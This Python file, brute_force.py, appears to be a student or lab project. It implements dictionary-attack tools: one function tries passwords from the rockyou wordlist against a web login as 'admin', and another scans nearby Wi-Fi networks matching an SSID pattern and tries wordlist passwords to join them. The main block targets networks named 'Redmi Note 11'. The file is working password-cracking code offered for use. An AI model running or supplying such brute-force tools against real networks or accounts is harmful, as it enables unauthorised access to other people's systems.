"""
@author: Duy Vuong & Skochilov Ignat
brute_force.py


"""

import requests
from bs4 import BeautifulSoup
from wifi_connect import connect_network_windows, profile_exists, run, get_default_gateway, scan_networks_windows

IP =  "http://127.0.0.1:5000"

def get_csrf_token(response) -> str:
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf'})['value']
    return csrf_token

def brute_force_pass_site(api_url: str, path_weak_pass: str) -> tuple[requests.Session|None, str|None]:
    try:
        with open(path_weak_pass, 'r', encoding='utf-8') as file:
            weak_passwords = file.read().splitlines()
    except FileNotFoundError:
        raise FileNotFoundError(f"File {path_weak_pass} not found.")
    except UnicodeDecodeError:
        ValueError(f"Could not decode file {path_weak_pass}")

    # truy cập vào ip và lặp các mật khẩu để đăng nhaap
    for password in weak_passwords:
        session = requests.Session()
        # try:
        #     response = session.get(api_url, timeout=3)
        # except requests.RequestException as e:
        #     return None, None
        # csrf_token = get_csrf_token(response)
        data = {
            "username": "admin",
            "password": password
        }
        response = session.post(api_url, data=data)
        if response.status_code == 200:
            print(f"[+] Found valid password: {password}")
            # csrf_token = get_csrf_token(response)
            return session, password
        else:
            print(f"[-] Invalid password: {password}")

    return None, None

def brute_force_pass_wifi(patern_ssid: str, path_weak_pass: str) -> tuple[str|None, str|None]:
    try:
        with open(path_weak_pass, 'r', encoding='utf-8') as file:
            weak_passwords = file.read().splitlines()
    except FileNotFoundError:
        raise FileNotFoundError(f"File {path_weak_pass} not found.")
    except UnicodeDecodeError:
        ValueError(f"Could not decode file {path_weak_pass}")

    results = scan_networks_windows(patern_ssid)
    if not results:
        return None, None
    ssids = [result["ssid"] for result in results]
    for ssid in ssids:
        print(f"Trying to connect to: {ssid} ...")
        if profile_exists(ssid):
            cp = run(f'netsh wlan delete profile name="{ssid}"')
            if cp.returncode != 0:
                raise RuntimeError(f"Could not delete profile {ssid}: {cp.stderr}")
        for password in weak_passwords:
            if len(password) < 8:
                continue
            if not ssid:
                raise ValueError(f"SSID with patern {patern_ssid} not found.")
            try:
                ok = connect_network_windows(ssid, password=password)
                if ok:
                    print(f"[+] Found valid password Wi-Fi: {password}")
                    ip = get_default_gateway()
                    return ssid, ip
                # else:
                    # print(f"[-] Invalid password: {password}")
            except Exception as e:
                print(f"[-] Error connecting with password {password}: {e}")

    return None, None



if __name__ == "__main__":
    ip = brute_force_pass_wifi("Redmi Note 11", "rockyou.txt")
    # api_url = f"http://{ip}:8080/gate"
    # session, csrf_token = brute_force_pass_site(api_url, "rockyou.txt")
    # print(session, csrf_token)



